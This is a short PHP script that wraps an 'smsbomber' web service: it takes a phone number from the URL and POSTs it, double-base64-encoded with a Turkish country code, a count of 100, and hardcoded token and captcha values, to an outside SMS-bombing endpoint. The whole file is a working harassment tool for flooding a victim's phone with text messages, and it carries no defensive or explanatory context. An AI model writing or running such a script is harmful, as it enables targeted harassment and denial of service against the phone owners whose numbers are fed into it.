<?php
// Check if 'number' parameter is set
if (isset($_GET['number'])) {
    $dataArray = array(
        "mobile" => $_GET['number'],
        "count" => 1,
        "country_code" => "90",
        "curr_count" => 100
    );
    $jsonData = json_encode($dataArray);
    $gaye1 = base64_encode($jsonData);
    $gaye = base64_encode($gaye1);
    $frsc = "_frsc=" . urlencode($gaye);
    $token = "WXpJeGVsZ3lTblppVjBwc1kyYzlQUT09";
    $captcha = "TWpNM01UY3lOTmpRd0RFM01UTURJd2s0TXc9PQ%3D%3D";

    $data = "{$frsc}&token_={$token}&captcha={$captcha}";

    $url = "https://greatonlinetools.com/smsbomber/endpoints/endpoint.php";

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $response = curl_exec($ch);
    curl_close($ch);
    echo $response;
} else {
    echo "Phone number is required.";
}
?>
